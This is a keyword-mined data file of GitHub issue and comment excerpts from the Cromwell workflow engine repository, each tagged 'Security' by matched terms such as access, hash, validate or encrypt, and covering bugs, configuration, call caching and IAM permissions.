Security,"While validating Google authentication, [currently](https://github.com/broadinstitute/cromwell/blob/8ededf0995d7fef1914cb744a1124e4c96328106/filesystems/gcs/src/main/scala/cromwell/filesystems/gcs/auth/GoogleAuthMode.scala#L65) only the exception message is logged. If the exception itself contains a causal exception, that information is discarded.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2090:6,validat,validating,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2090,2,"['authenticat', 'validat']","['authentication', 'validating']"
Security,Whilst looking into non-MySQL based solutions for CQRS read stores I saw what I thought was a neat idea. By tagging each event with a version it is possible to not do bulk migrations when one needs to modify event entity structure (aside: we need to find ways to reduce that) but rather to migrate them the first time they're accessed.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2356:326,access,accessed,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2356,1,['access'],['accessed']
Security,Why is it that Womtool validates WDLs with task called with missing inputs while Cromwell immediately flags them as incorrect?,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7139:23,validat,validates,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7139,1,['validat'],['validates']
Security,"Wire in Docker hash fetching, persist Docker image hash and results cloned from.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/322:15,hash,hash,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/322,2,['hash'],['hash']
Security,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:183,hash,hash,183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479,4,"['hash', 'password']","['hash', 'password']"
Security,"With compliments to @mcovarr for the rebase base. Creates hashes for the following:; - command; - backend name; - output expression; - non-file inputs (as simpletons); - file input paths (according to config). Not included in this PR:; - backend specific hashes (runtime attributes, docker, file contents). Note that if you want anything to actually be written you'll want the following options (to avoid a hashing failure); - `lookup-docker-hash=false`; - `hash-docker-names=false`; - `hash-file-paths=true` -- actually you could leave this false but... then you'd always cache hit regardless of what files you're using!; - `hash-file-contents=false`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1291:58,hash,hashes,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1291,7,['hash'],"['hash', 'hash-docker-names', 'hash-file-contents', 'hash-file-paths', 'hashes', 'hashing']"
Security,"With the SFS backend, when call caching files can be copied, sym linked or hard linked. With JES we only support copying the file. Provide a mechanism for the JES backend in the config file to either copy the files or leave them in place and access them that way.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330:242,access,access,242,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330,1,['access'],['access']
Security,With the new caching heuristic for generating File input hashes (`path+modtime`) relies on soft-linking for it to work correctly. Having soft-links disabled by design when containerizing a task makes this option mood. I consider it weird that a config option has a hard-override within cromwell... leave it up to users to configure their backend.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494:57,hash,hashes,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494,1,['hash'],['hashes']
Security,With the present design access to the workflow store would be contentious among multiple worker Cromwells. #3761 addresses the issue of a single Cromwell deadlocking itself but would not address the issue of multiple Cromwells deadlocking each other.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3795:24,access,access,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3795,1,['access'],['access']
Security,Wom: Reinstate member access,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2861:22,access,access,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2861,1,['access'],['access']
Security,WomExpression should expose a source string value,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2607:21,expose,expose,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2607,1,['expose'],['expose']
Security,"Womtool does not give error if the file does not exist, so; ```; java -jar ~/Soft/womtool-37.jar validate I_do_not_exist.wdl; ```; Returns me ; ```; /pipelines/sources/rna-seq/pipelines/quantification/I_do_not_exist.wdl; ```; so I think that everything is ok as no erorrs is given while in fact I have a typo in the filename somewhere",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4665:97,validat,validate,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4665,1,['validat'],['validate']
Security,Womtool doesn't validate output delcarations for imported tasks correctly,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3942:16,validat,validate,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3942,1,['validat'],['validate']
Security,"Womtool on the command line takes wildly longer, probably all due to JVM startup cost; ```; anichols@wm97a-a85 ~/Dropbox/Broad Institute/Bugs/cromwell-4573 $ time womtool validate cpu_WDL.wdl . real	0m3.585s; user	0m7.393s; sys	0m0.552s; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340601:171,validat,validate,171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-458340601,1,['validat'],['validate']
Security,Womtool validate does not acept wdl files with only tasks,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3762:8,validat,validate,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3762,1,['validat'],['validate']
Security,Womtool validates CWL (maybe),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4285:8,validat,validates,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4285,1,['validat'],['validates']
Security,Womtool validation for arrays not fully implemented,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6834:8,validat,validation,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6834,1,['validat'],['validation']
Security,Work as an ambassador to FireCloud to have them test out v0.20 in their standard tests (especially access token related) to quick resolve issues and file any necessary tickets.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/998:99,access,access,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/998,1,['access'],['access']
Security,Workflow Docker Hashing.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2282:16,Hash,Hashing,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2282,1,['Hash'],['Hashing']
Security,Workflow ID validation + Outputs/Logs non-404ing. Closes #1138,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1154:12,validat,validation,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1154,1,['validat'],['validation']
Security,Workflow options not encrypted in DB - hotfix,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/999:21,encrypt,encrypted,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/999,1,['encrypt'],['encrypted']
Security,Workflow validation for labels PATCH goes to summary not metadata.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4617:9,validat,validation,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4617,1,['validat'],['validation']
Security,"Workflow-failure-mode determines what happens to other calls when a call fails. Can be either ContinueWhilePossible or NoNewCalls.; // Can also be overridden in workflow options. Defaults to NoNewCalls. Uncomment to change:; //workflow-failure-mode: ""ContinueWhilePossible""; }. // Optional call-caching configuration.; call-caching {; enabled = true. // The Docker image specified in the 'runtime' section of a task can be used as-is; // or Cromwell can lookup this Docker image to get a complete hash. For example,; // if a task specifies docker: ""ubuntu:latest"" and if lookup-docker-hash is true,; // Then Cromwell would query DockerHub to resolve ""ubuntu:latest"" to something like; // a2c950138e95bf603d919d0f74bec16a81d5cc1e3c3d574e8d5ed59795824f47; //; // A value of 'true' means that call hashes will more accurately represent the; // Docker image that was used to run the call, but at a cost of having to make a; // request to an external service (DockerHub, GCR). If a call fails to lookup a; // Docker hash, it will fail.; lookup-docker-hash = false; }. google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh_token""; client-id = ""secret_id""; client-secret = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/file.pem""; }; ]; }. engine {; // This instructs the engine which filesystems are at its disposal to perform any IO operation that it might need.; // For instance, WDL variables declared at the Workflow level will be evaluated using the filesystems declared here.; // If you intend to be able to run workflows with this kind of declarations:; // workflow {; // String str = read_string(""gs://bucket/my-file.txt""); // }; // You will need to provide the engine with a gcs filesystem; // Note that the default filesystem (local) is always available.; //filesystems {; // gcs {; // a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:86763,hash,hash,86763,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['hash'],['hash']
Security,WorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkflowDefinition.scala:87); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$convertGraphElements$3(WorkflowDefinitionElementToWomWorkflowDefinition.scala:64); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convert(WorkflowDefinitionElementToWomWorkflowDefinition.scala:38); wdl.draft3.transforms.wdlom2wom.package$.$anonfun$workflowDefinitionElementToWomWorkflowDefinition$1(package.scala:12); common.transforms.package$CheckedAtoB$.$anonfun$runThenCheck$1(package.scala:15); wdl.draft3.transforms.wdlom2wom.FileElementToWomBundle$$anon$1.$anonfun$toWomBundle$6(FileElementToWomBundle.scala:54); cats.instances.VectorInstances$$anon$1.$anonfun$traverse$2(vector.scala:77); cats.instances.VectorInstances$$anon$1.loop$2(vector.scala:40); cats.instances.VectorInstances$$anon$1.$anonfun$foldRight$2(vector.scala:41); cats.Eval$.advance(Eval.scala:272); cats.Eval$.loop$1(Eval.scala:354); c,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:5186,validat,validation,5186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,WorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkflowDefinition.scala:87); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$convertGraphElements$3(WorkflowDefinitionElementToWomWorkflowDefinition.scala:64); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.convertGraphElements(WorkflowDefinitionElementToWomWorkflowDefinition.scala:63); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertOuterScatter$10(ScatterElementToGraphNode.scala:72); scala.Function3.$anonfun$tupled$1(Function3.scala:35); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); common.validation.ErrorOr$ShortCircuitingFlatMapTuple3$.flatMapN$extension(ErrorOr.scala:53); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertOuterScatter(ScatterElementToGraphNode.scala:65); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:33); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.Workflo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:2835,validat,validation,2835,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,WorkflowValidationActor - Generic Validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/433:34,Validat,Validation,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/433,1,['Validat'],['Validation']
Security,"Would having that information (filesystems configured for a backend) in the existing backend endpoint work for you ? I don't think we can consider a generic ""get a config value"" endpoint as it would be a massive security hole because the configuration contains secrets and passwords.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430:212,secur,security,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430,2,"['password', 'secur']","['passwords', 'security']"
Security,"Would you mind explaining the difference between `pull` and `build`? The reason I did build is because I needed to know where the output image ended up, so I could run it directly. If I `singularity pull docker://ubuntu`'d the image, and then `singularity run docker://ubuntu` from the worker, it would still try to pull the image a second time, and then hang forever because it didn't have network access. . Also, isn't the ability to build a binary image something that `build` can do, not `pull`?. The only reason I built a sandbox instead is simply because my admins wouldn't set the `setuid` bit, so it wouldn't work. Am I missing something here?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333:399,access,access,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333,2,['access'],['access']
Security,Wrap hash values from cromwell-backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/457:5,hash,hash,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/457,1,['hash'],['hash']
Security,"Write a workflow such that you run a task A, and then run task A again with one of the call caching hash components is altered to confirm there were no false positive call cache hits. The hash components to tweak include:; - [x] input files (in this case, a secondary task can be used to alter the input files for task A); - [x] command template; - [x] backend name; - [x] output expressions; - [x] runtime attributes; - [x] non-file inputs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1985:100,hash,hash,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1985,2,['hash'],['hash']
Security,Write some stub functions to request if access should be granted or to associate a workflow id with a principal. At this stage the responses can be completely mocked,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2131:40,access,access,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2131,1,['access'],['access']
Security,XhwcmVzc2lvbi9yZW5hbWluZy9CaW5hcnlPcGVyYXRvckV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...l/services/womtool/models/WomTypeJsonSupport.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21haW4vc2NhbGEvY3JvbXdlbGwvc2VydmljZXMvd29tdG9vbC9tb2RlbHMvV29tVHlwZUpzb25TdXBwb3J0LnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...end/impl/sfs/config/CpuDeclarationValidation.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvc2ZzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9zZnMvY29uZmlnL0NwdURlY2xhcmF0aW9uVmFsaWRhdGlvbi5zY2FsYQ==) | `0% <0%> (-100%)` | :arrow_down: |; | [...aft2/src/main/scala/wdl/draft2/model/package.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL21vZGVsL2RyYWZ0Mi9zcmMvbWFpbi9zY2FsYS93ZGwvZHJhZnQyL21vZGVsL3BhY2thZ2Uuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...ool/src/main/scala/womtool/validate/Validate.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d29tdG9vbC9zcmMvbWFpbi9zY2FsYS93b210b29sL3ZhbGlkYXRlL1ZhbGlkYXRlLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...king/expression/files/BiscayneFileEvaluators.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-d2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvc3JjL21haW4vc2NhbGEvd2RsL3RyYW5zZm9ybXMvYmlzY2F5bmUvbGlua2luZy9leHByZXNzaW9uL2ZpbGVzL0Jpc2NheW5lRmlsZUV2YWx1YXRvcnMuc2NhbGE=) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/backend/impl/bcs/BcsDocker.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c3VwcG9ydGVkQmFja2VuZHMvYmNzL3NyYy9tYWluL3NjYWxhL2Nyb213ZWxsL2JhY2tlbmQvaW1wbC9iY3MvQmNzRG9ja2VyLnNjYWxh) | `0% <0%> (-100%)` | :arrow_down: |; | [...in/scala/cromwell/services/metadata/metadata.scala](https://codecov.io/gh/broadinstitute/cromwell/pull/4947/diff?src=pr&el=tree#diff-c2VydmljZXMvc3JjL21ha,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620:2925,validat,validate,2925,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4947#issuecomment-491028620,3,"['Validat', 'validat']","['Validate', 'validate']"
Security,"YAML claims to be a superset of JSON, but it is not (as this proves). Every time I have encountered YAML in a project it has been a headache, just my 2c. It is a strange syntax, with the potential for infinite recursion and bombs. It makes for a hard parser implementation, and there have been security and perfomance issues in the past. Fine for local configuration files, but probably not a good idea for any public facing APIs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556:294,secur,security,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3487#issuecomment-379600556,1,['secur'],['security']
Security,"Yeah actually sorry I was giving @kshakir and the rest of you a hard time about the parent column. I thought about it a lot yesterday and realized that it does actually make sense. The key to it, which I think I didn't fully appreciate at the time, was that it was shards pointing to shards, which is the thing that the Namespace is not capturing. Using this approach we now have a way to keep track of multiple levels of scattering. For any entry, we can find all `Scatter` ancestors entries in the ExecutionStore and then we have the `Scatter` objects (in order going up the tree) along with their respective indexes. The lookup function (which resolves WDL identifiers into their values), should only need access to some data structure like this: `Seq[(item: String, collection: WdlExpression, index: Int)]`. Where the size of that `Seq` would be the same size as the number of times nested you are. This would allow it to properly index into the scattered arrays.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325:709,access,access,709,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/143#issuecomment-133389325,1,['access'],['access']
Security,"Yeah, this was from way back when we on FC thought we'd be parsing the WDL and doing docker-hash switcheroos ourselves. But you ended up doing it! So my use case for needing this has gone away.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681:92,hash,hash,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335903681,1,['hash'],['hash']
Security,"Yep, you were right about this bug, it was because the IAM role that Cromwell uses did not have write access to the S3 bucket. The actual AWS Batch worker instances did have write access, so the workflow didn't fail until it hit `write_lines`, which is executed by the Cromwell server, not by the Batch machine. However, this is actually the fault of the CloudFormation scripts that generated this role. I used the scripts [hosted here](https://s3.amazonaws.com/aws-genomics-workflows/templates/cromwell/cromwell-server.template.yaml), from [this webpage](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/). Notice how the IAM role only has `s3:GetObject` permissions, not `PutObject` etc:. ```yaml; Ec2InstanceRole:; Type: AWS::IAM::Role; Properties:; Policies:; - PolicyName: !Sub CromwellServer-S3Bucket-Access-${AWS::Region}; PolicyDocument:; Version: 2012-10-17; Statement:; Effect: Allow; Resource: !Join ["""", [""arn:aws:s3:::"", !Ref S3BucketName, ""/*""]]; Action:; - ""s3:GetObject""; ```. @aednichols Do you happen to know who wrote these scripts or where the code is hosted? Because I would like to submit a change to them to fix this bug",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259:102,access,access,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4275#issuecomment-431235259,3,"['Access', 'access']","['Access', 'access']"
Security,"Yes I think the `-` needs to be escaped.; If you could also make the same change on line 52, and add a new line with your docker image in the table in `DockerImageIdentifierSpec` to validate that it works it would be great :). Thanks !",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158:182,validat,validate,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2591#issuecomment-326665158,1,['validat'],['validate']
Security,Yes if the validation is going to be centralized here there have to be tests that are at least equivalent to what's in `WorkflowDescriptor`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096:11,validat,validation,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197048096,1,['validat'],['validation']
Security,"Yes that surprised me too. The numbers are averages so it's possible that it kinds of flattens out around ~20/30ms, and the 10000 happened to have slightly better runs. It does it 30 times for each of the sizes. The minimum time value would be a better indicator maybe. Edit: Did the same with min times. There's still a weird timing where 8K was longer.; The main difference between the 2 approaches is that before we would go through the list of ""done"" keys one by one until we find the one we want. Which means the longer the list the longer the time in average. However now we go through it once to create a map, and then it becomes a hash lookup every other time. for develop:. <img width=""326"" alt=""screen shot 2017-04-22 at 12 28 58 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306250/5dcc9d1c-2757-11e7-8987-0aaec4d4a038.png"">. and this branch:; <img width=""323"" alt=""screen shot 2017-04-22 at 12 23 06 pm"" src=""https://cloud.githubusercontent.com/assets/2978948/25306253/68140aa8-2757-11e7-8483-f6f2770c031d.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021:639,hash,hash,639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2198#issuecomment-296384021,1,['hash'],['hash']
Security,"Yes there are! Like if your inputs are shared with other users and they; come from varying sources and you're not allowed to make copies. Something; like that is very common. On Fri, Jun 7, 2019 at 7:25 PM W. Lee Pang, PhD <notifications@github.com>; wrote:. > This line in the stack trace indicates the root cause:; >; > at software.amazon.awssdk.services.s3.S3Client.listBuckets(S3Client.java:2184); >; > The permissions for the Cromwell server currently only provide full access; > to the S3 bucket specified in the CloudFormation template. Adding the; > AmazonS3ReadOnlyAccess managed policy to the server's instance profile; > fixes this, but I wonder if it can be more refined. Specifically, is there; > a case where a Cromwell server would need to read from more than one bucket?; >; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/4686?email_source=notifications&email_token=ADR7XTOW5ARNYDZTLRZEEODPZLU6RA5CNFSM4G2ZBAQ2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGODXHHEUY#issuecomment-500068947>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ADR7XTOOSUHDDDUED4MXDEDPZLU6RANCNFSM4G2ZBAQQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085:475,access,access,475,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-500810085,1,['access'],['access']
Security,"Yes, that's granting it at the project level (`gcloud projects add-iam-policy-binding`).; Granting at the SA level would probably be in this case; ```; gcloud iam service-accounts add-iam-policy-binding \; serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --member serviceAccount:MY-NUMBER-compute@developer.gserviceaccount.com \; --role roles/iam.serviceAccountUser; ```; Notice that here we grant `MY-NUMBER-compute` SA `iam.serviceAccountUser` role on itself! This is probably not the best practice, as you should use a separate SA for Cromwell VM from the one that is used by Cromwell jobs.; Still, this is better than granting it at the project level, as otherwise any machine started with the default `MY-NUMBER-compute` SA can act as any other SA in that project. Additionally, it's not good to use the default SA at all, ideally you should create a dedicated SA for Cromwell itself and also another dedicated SA for the Cromwell jobs. That being said, if you're running this in an isolated project that doesn't have any access to anything else, this may be fine. But that's why it takes quite a bit of effort/know-how to set up Cromwell properly. I agree this is not an easy task, and should be documented a bit more ;)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065:1044,access,access,1044,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4304#issuecomment-686192065,1,['access'],['access']
Security,"Yes... although since the 'encrypted-fields' is blank it probably doesn't; matter a whole lot but this does seem a little odd to me. Anyone know why; this was put in here?. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Mon, Nov 23, 2015 at 3:55 PM, Chris Llanwarne notifications@github.com; wrote:. > I see in application.conf the following. Is this a candidate for storing; > securely in vault?; > ; > workflow-options {; > // These workflow options will be encrypted when stored in the database; > encrypted-fields: []; > ; > // AES-256 key to use to encrypt the values in encrypted-fields; > base64-encryption-key: ""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=""; > }; > ; > —; > Reply to this email directly or view it on GitHub; > https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159061507; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141:27,encrypt,encrypted-fields,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/300#issuecomment-159069141,7,"['encrypt', 'secur']","['encrypt', 'encrypted', 'encrypted-fields', 'encryption-key', 'securely']"
